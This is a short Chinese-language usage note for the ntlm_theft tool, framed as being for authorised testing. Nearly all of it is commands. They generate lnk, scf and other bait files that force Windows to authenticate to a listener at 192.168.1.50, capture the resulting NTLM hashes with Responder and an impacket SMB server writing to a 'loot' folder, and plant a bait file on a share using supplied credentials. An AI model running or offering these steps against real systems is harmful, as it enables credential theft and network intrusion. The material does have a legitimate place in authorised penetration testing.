# ntlm_theft 使用

ntlm_theft 用来生成会触发 Windows 认证的文件样本，适合在授权测试里验证文件预览、共享访问和安全策略。使用时要明确投放路径和回连监听。

## 生成样本

```bash
python3 ntlm_theft.py -g all -s 192.168.1.50 -f test
```

```bash
python3 ntlm_theft.py -g lnk -s 192.168.1.50 -f report
```

```bash
python3 ntlm_theft.py -g scf -s 192.168.1.50 -f desktop
```

## 监听认证

```bash
sudo responder -I eth0 -A
```

```bash
sudo tcpdump -i eth0 -nn host 192.168.1.50 and port 445
```

```bash
impacket-smbserver share ./loot -smb2support
```

## 投放验证

```bash
smbclient //192.168.1.10/share -U 'domain/user%pass' -c 'put report.lnk'
```

小记录：这个工具适合验证“打开目录或预览文件是否会泄露认证”。测试文件命名、投放位置和清理动作要写清楚。
